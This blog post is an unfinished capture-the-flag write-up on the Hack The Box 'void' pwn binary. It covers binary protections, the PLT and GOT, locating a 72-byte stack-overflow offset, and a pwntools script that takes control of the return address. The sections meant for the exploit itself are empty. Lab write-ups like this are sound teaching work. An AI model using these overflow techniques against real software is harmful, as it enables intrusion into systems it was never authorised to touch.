---
layout: post
title:  Hack The Box - Void
description: Void pwn challenge
date: Sat Jul  6 12:40:15 UTC 2024
image: '/images/kevin-ku-w7ZyuGYNpRQ-unsplash.jpg'
image_caption: ''
tags: [htb, ctf, pwn, binexp, ret2dlresolve]
---

TL;DR This post is about how to solve `void` from Hack The Box using `pwntools` (and maybe manually). This challenge involved exploiting a stack-based buffer overflow in a program to control execution, leading into a ret2dlresolve (return to dl_resolve) attack.

I really liked this challenge, because it was the first one that I really leaned on
`pwntools` for. Usually, I use `pwntools` for IO and try to do everything else manually. 
The result is a messy script that is incredibly hard to read, even for the person who wrote it.

Ret2dlresolve attacks are supported in `pwntools` and I was surprised how easy it was to setup
in the code. `Pwntools` is like a declarative programing language, where you express a desire for a certain state to be set up and the module figures out the magic necessary to do it, 
if it's possible.

## Exploring the Binary
For CTF pwn binaries, usually the first step I take is to learn about the security features of the
program. A tool/script called `checksec` works well to summarize these features.

```bash
# checksec --file=./void
[*] '/pwn/void'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./glibc/'
```

What I notice (and the order I notice it in) is:
1. the program is 64-bit x86
2. NX is enabled, so shellcode will not execute on the stack
3. There is no stack canary.
    1. Easy challenge ranking + no stack canary = easy win?
4. Partial `RELRO` is as good as no `RELRO` :D
5. no PIE _and_ no canary could mean I don't have to worry about leaking anything
    1. ik ik, but it's tedious when you don't know how to use `pwntools`
6. They give us the version of `glibc` that is linked with this program
    1. I assume this is the same version running on the remote server (the one with the flag). Why else would they give it to us.

Armed with some basic knowledge, I look more into the actual contents.

I like to use radare2/rabin2 for disassembly, and gdb with the pwndbg extension for debugging.

Since glibc is part of this, let's look at import

```bash
# rabin2 -i void
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x00401030 GLOBAL FUNC       read
2   ---------- GLOBAL FUNC       __libc_start_main
3   ---------- WEAK   NOTYPE     __gmon_start__
```

Just read? That can't be right. Maybe it's time to run it to see what it actually does.

```bash
root@4a0d0942050b:/pwn# ./void

root@4a0d0942050b:/pwn#
```

All it does it read a line of input and exit, there is no output of any kind. I guess this
is why it's called "void."

I run it again, with gdb and disassemble `main`

```nasm
pwndbg> disass main
Dump of assembler code for function main:
   0x0000000000401143 <+0>:     push   rbp
   0x0000000000401144 <+1>:     mov    rbp,rsp
   0x0000000000401147 <+4>:     sub    rsp,0x10
   0x000000000040114b <+8>:     mov    DWORD PTR [rbp-0x4],edi
   0x000000000040114e <+11>:    mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000401152 <+15>:    call   0x401122 <vuln>
   0x0000000000401157 <+20>:    mov    eax,0x0
   0x000000000040115c <+25>:    leave
   0x000000000040115d <+26>:    ret
```

That call to `vuln` looks like the obvious place to put a vulnerability.

```nasm
pwndbg> disass vuln
Dump of assembler code for function vuln:
   0x0000000000401122 <+0>:     push   rbp
   0x0000000000401123 <+1>:     mov    rbp,rsp
   0x0000000000401126 <+4>:     sub    rsp,0x40
   0x000000000040112a <+8>:     lea    rax,[rbp-0x40]
   0x000000000040112e <+12>:    mov    edx,0xc8
   0x0000000000401133 <+17>:    mov    rsi,rax
   0x0000000000401136 <+20>:    mov    edi,0x0
   0x000000000040113b <+25>:    call   0x401030 <read@plt>
   0x0000000000401140 <+30>:    nop
   0x0000000000401141 <+31>:    leave
   0x0000000000401142 <+32>:    ret
End of assembler dump.
```

This function sets up a call to `read` in libc. It is really calling `read@plt` which is the
procedure linkage table. This area of memory if used by the dynamic function name resolution process.

### PLT Aside
The PLT for a function is a stub of (maybe? usually? probably?) 3 instructions. We can inspect them
with `x/3i <address>` like this

```nasm
pwndbg> x/3i 0x401030
   0x401030 <read@plt>: jmp    QWORD PTR [rip+0x2fe2]        # 0x404018 <read@got.plt>
   0x401036 <read@plt+6>:       push   0x0
   0x40103b <read@plt+11>:      jmp    0x401020
```

The first instruction jumps to `read@got.plt` which is the **G**lobal **O**ffset **T**able. Which is a
table of addresses for libc functions. Because we haven't resolve `read` yet, the address for `read` in the GOT is actually going to be the second instruction of our stub. 

As you can see, the address for read in libc will be at `0x404018` after resolution. Before, it should be `0x401036`. Let me show check by examining the gword (8 byte) in hex

```nasm
pwndbg> x/gx 0x404018
0x404018 <read@got.plt>:        0x0000000000401036
```

Great, maybe I do get this. I should move on.

## Exploring the Buffer Overflow
If you do a `man 2 read` you can get the function signature for `read`. It looks like this:

```c
ssize_t read(int fd, void buf[.count], size_t count);
```

The parameters are
1. fd, the file descriptor, which is `0` in your program for `stdin`
2. buf, the destination buffer
3. count, how many bytes to read. Important to get correct, sometimes.

The program's use of read is a vulnerability. In the disassembly of `vuln` we see space being made on the stack,

```nasm
0x0000000000401126 <+4>:     sub    rsp,0x40
```

The function made space for 0x40 (64) bytes. When it moves the `count` arg into `edx`,

```nasm
0x000000000040112e <+12>:    mov    edx,0xc8
```

it sets edx to 0xc8 (200). The program will read 200 bytes and store it in the 64 byte buffer.

Time to find the offset to control RIP.

## Finding the offset
> A journey of 1,000 miles begins with finding the offset

1. Generate a pattern of 199 bytes; the buffer is 200, but we will send a newline and 199 characters when we send it with pwntools.

```bash
pwndbg> !cyclic 199
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```

2. Save the payload to a file so we can replay it in GDB

```bash
pwndbg> cyclic 199 > payload.txt
```

3. Set a breakpoint at the `ret` instruction in the `vuln` function. It is 32 bytes from the beginning of the function

```bash
pwndbg> b * vuln + 32
Breakpoint 1 at 0x401142
```

4. Run with GDB and the program should crash

![crash]({{site.baseurl}}/images/void/screenshot1.png)
*crash in void with 199 bytes*

5. The value `0x6161617461616173` is the address where the program is trying to return to, from the function `vuln`. We can use the last 4 bytes of this address to find the offset in our cyclic pattern.

[Cyber Chef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')Reverse('Character')&input=MHg2MTYxNjE3NDYxNjE2MTcz) is useful for this.

![cyber chef recipe]({{site.baseurl}}/images/void/screenshot2.png)
*Cyber Chef recipe turns hex back to string*

The 4 character string we should search for is 'saaa'.

6. The `cyclic` tool can tell us where this pattern occurs in the pattern we generated, a.k.a., the offset.

```bash
pwndbg> !cyclic -l saaa
72
```

The offset appears to be 72. We can test it by generating a 72 byte pattern and appending 8 `A` characters to it. It's probably also a good idea to pad the payload to 199 bytes to be consistant with the payload we sent.

```bash
pwndbg> !echo -n aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaa > payload2.txt
pwndbg> !echo -n 'AAAAAAAA' >> payload2.txt
pwndbg> !cyclic 119 >> payload2.txt
pwndbg> !cat payload2.txt
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaaAAAAAAAAaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaapwndbg>
```

7. Run this. If we're correct, the return address should be `0x4141414141414141`. We run 

```bash
r < payload2.txt
``` 

and...

```bash
0x401142 <vuln+32>    ret                                <0x4141414141414141>
```
success, we're in! (_almost_)

## Generate Pwn Script
I like to use the default template pwntools generates. 

I haven't started the remote host yet, so host and port are just placeholders, for now.

```bash
pwn template --host 0.0.0.0 --port 1337 --libc ./glibc/libc.so.6 void > exploit.py
```

### Testing the Script
I use `tmux` and `docker` to solve pwn challenges, and an inconvience of this is that I need
to use multiple panes to interact with the script. 

We launch the script in one pane and block
using Python's `input()` function. 

Here is the "main" of the script:

```python
io = start()

payload = fit({
    72: b'A' * 8,
}, length=199)

input('\n[Press ENTER to send payload]\n')
io.send(payload)

io.interactive()
```

We run it

```bash
python3 exploit.py LOCAL LOCAL_LIBC
```

and see

```bash
root@4a0d0942050b:/pwn# python3 exploit.py LOCAL LOCAL_LIBC
[*] '/pwn/void'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./glibc/'
[*] '/pwn/glibc/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/pwn/void': pid 1052

[Press ENTER to send payload]

```

Then we attach to it using GDB. We can save GDB commands in a file and use `-x` to automate
them. You can launch GDB from the pwntools script, but it doesn't play nicely with tmux.

Here is an example of a GDB command file, called `gdbx`

```bash
break *vuln + 32
continue
```

Attach to the running process

```bash
gdb -q -p $(pgrep void) -x gdbx
```

When we press the enter key the program should crash, and we should ovserve the return address to be full of `0x41` bytes, just like before.

## The Exploit
The script is ready, it's time to figure out how to exploit the overflow.

### Failure to Write

## Exploiting Remote Service

<div class="gallery-box">
  <div class="gallery">
    <img src="/images/" loading="lazy" alt="Books">
  </div>
  <em>Photo by <a href="https://unsplash.com/photos/_awzRovsBDU" target="_blank">NMG Network</a> on <a href="https://unsplash.com/" target="_blank">Unsplash</a></em>
</div>

